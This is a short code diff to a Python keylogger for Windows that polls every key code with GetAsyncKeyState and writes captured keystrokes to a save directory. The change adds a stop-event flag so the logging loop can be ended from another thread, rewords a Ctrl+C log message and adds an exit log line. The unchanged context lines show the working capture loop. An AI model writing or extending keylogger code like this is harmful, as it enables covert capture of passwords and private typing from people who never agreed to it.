@@ -95,7 +95,7 @@ def pressCASkey(key_name):
     status = win32api.GetKeyState(ck_key[key_name])
     return True if status < 0 else False
     
-def keylogger(save_dir):
+def keylogger(save_dir, isEndFlag):
     try:
         keys = getAllKeys()
         result = ''
@@ -105,6 +105,8 @@ def keylogger(save_dir):
             os.makedirs(save_dir)
         
         while True:
+            if isEndFlag.is_set():  # 該結束了
+                break
             name = ''
             for code in [3] + list(range(8, 256)):
                 status = win32api.GetAsyncKeyState(code)
@@ -149,9 +151,12 @@ def keylogger(save_dir):
                 result = ''
                 time.sleep(0.01)
     except KeyboardInterrupt:
-        logging.debug('Ctrl+C to break program')
+        logging.debug('catch Ctrl+C in {}'.format(__name__))
     except Exception as e:
         logging.error('Error: {}'.format(e.args))
+    
+    logging.info('Keylogger out')
+    return None
 
 if __name__ == '__main__':
     # DEBUG use
